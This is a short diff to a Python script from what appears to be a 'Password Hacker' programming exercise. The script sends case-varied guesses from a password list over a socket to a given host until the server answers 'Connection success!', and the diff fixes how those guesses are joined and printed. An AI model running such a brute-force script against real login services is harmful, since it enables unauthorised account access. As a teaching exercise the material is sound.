@@ -34,7 +34,7 @@ import socket
 import sys
 
 
-with open('passwords.txt', 'r') as file:
+with open(r'D:\pythonProject\Password Hacker\Password Hacker\task\hacking\passwords.txt', 'r') as file:
     password_list = file.read().split()
 
 host_name, port = sys.argv[1:]
@@ -43,10 +43,10 @@ with socket.socket() as client_socket:
     for password in password_list:
         password_iter = itertools.product(*list(zip(password.lower(), password.upper())))
         for passwords in password_iter:
-            client_socket.send(passwords.encode())
+            client_socket.send(''.join(passwords).encode())
             response = client_socket.recv(1024).decode()
             if response == 'Connection success!':
-                print(password)
+                print(''.join(passwords))
                 exit()
     else:
         print('Wrong password!')
